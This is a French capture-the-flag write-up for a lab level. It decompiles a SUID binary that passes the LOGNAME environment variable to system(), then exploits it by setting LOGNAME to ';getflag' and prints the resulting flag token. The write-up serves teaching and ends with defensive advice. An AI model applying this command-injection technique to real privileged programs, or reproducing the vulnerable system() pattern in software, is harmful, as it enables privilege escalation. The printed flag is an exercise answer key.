# Level 07

## 📋 Informations

- **Domaine** : Command Injection (Environment Variable)
- **Objectif** : Exploiter l'utilisation non sécurisée de `system()` et d'une variable d'environnement pour exécuter du code arbitraire.

---

## 🔍 Exploration

Nous trouvons an binaire `level07`. Analysons son comportement via décompilation.

```c title:level07.c
int main(int argc,char **argv,char **envp) {
  char *param2;
  int iVar1;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *cmd_str;
  __gid_t rgid;
  __uid_t ruid;
  
  rgid = getegid();
  ruid = geteuid();
  setresgid(rgid,rgid,rgid);
  setresuid(ruid,ruid,ruid);
  
  cmd_str = (char *)0x0;
  param2 = getenv("LOGNAME");
  asprintf(&cmd_str,"/bin/echo %s ",param2);
  iVar1 = system(cmd_str);
  return iVar1;
}
```

> [!NOTE]
> **Privilèges**
> Comme pour les niveaux précédents, le programme propage les droits du SUID (`geteuid`) à l'ensemble du processus via `setresuid`. Le binaire s'exécutera donc avec les droits de `flag07`.

---

## 🛠️ Analyse

Le programme effectue les actions suivantes :
1.  Il récupère la valeur de la variable d'environnement `LOGNAME` (`getenv("LOGNAME")`).
2.  Il construit une commande shell avec `asprintf` : `/bin/echo <VALEUR_LOGNAME>`.
3.  Il exécute cette chaîne via `system()`.

> [!IMPORTANT]
> **La faille : `system()`**
> La fonction `system()` exécute la commande passée en argument en appelant `/bin/sh -c`.
> Contrairement à `execve` (qui prend une liste d'arguments séparés), `system` interprète la chaîne comme une commande shell complète.
> Cela signifie que nous pouvons utiliser des métacaractères shell (`;`, `&&`, `|`) dans `LOGNAME` pour chaîner ou injecter d'autres commandes.

---

## 🔓 Résolution

### 1. Compréhension de l'injection
La commande construite sera `/bin/echo $LOGNAME`.
Si `LOGNAME` contient `; getflag`, la commande finale devient :
`/bin/echo ; getflag`

Le shell va donc :
1.  Exécuter `echo` (vide).
2.  Exécuter `getflag` (avec les droits du binaire SUID).

### 2. Exploitation

Modifions la variable d'environnement et exécutons le binaire.

```bash
export LOGNAME=";getflag"
./level07
```

### 3. Résultat

```text
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

**Flag Final :**
```text
fiumuikeil55xe9cu4dood66h
```

---

## 📚 Notions utiles

- **Environment Injection** : Ne jamais faire confiance aux variables d'environnement (`LOGNAME`, `PATH`, etc.) dans un binaire privilégié.
- **Command Injection** : Danger de `system()`, `popen()` qui invoquent un shell. Préférer `execve()` avec des arguments fixes.
- **Shell Separators** : `;` permet d'exécuter une commande après la précédente (qu'elle réussisse ou non).